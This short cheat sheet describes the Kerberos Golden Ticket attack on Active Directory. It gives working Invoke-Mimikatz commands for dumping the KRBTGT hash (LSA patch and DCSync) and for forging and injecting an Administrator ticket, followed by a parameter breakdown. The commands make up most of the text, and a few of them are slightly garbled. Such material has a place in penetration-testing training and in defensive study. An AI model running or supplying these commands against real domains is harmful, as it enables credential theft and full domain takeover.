A Golden Ticket attack involves an attacker gaining control of the KRBTGT hash and using that to forge valid TGTs in the domain.
A TGT can be forged for any user if the KRBTGT hash is obtained. 

This attack involves using Invoke-Mimikatz to create the TGTs.


```powershell
#Execute mimikatz on DC as DA to get krbtgthash
Invoke-Mimikatz -Command '"lsadump::lsa/patch"' –Computername example-dc 


#On any machine 
Invoke-Mimikatz-Command '"kerberos::golden /User:Administrator /domain:example.local /sid:S-1-5-21-1874506631-3219958514-538503648 /krbtgt:ff46a9d8bd66c6efd77603da26799hbn id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"' 


#To use the DCSyncfeature for getting krbtgthash execute the below command with DA privileges:
Invoke-Mimikatz -Command '"lsadump::dcsync /user:example\krbtgt"'
#Using the DCSyncoption needs no code execution (no need to run Invoke-Mimikatz) on the target DC. 
```

Breakdown of Invoke-Mimikatz command:
```sh
Kerberos:golden - Name of the module used
/user - The user account which the TGT will be generated for
/domain - domain FQDN
/sid - SID of the domain
/krbtgt - NTLM hash of the krbtgt account, /aes128 and /aes256 can be used also
/id,/groups - User ID and Group ID
/ptt - Injects the ticket into the current PowerShell process

/startoffset -  These last 3 options are optional inputs that can be used to match the current domain configuration for tickets
/endin
/renewmax
```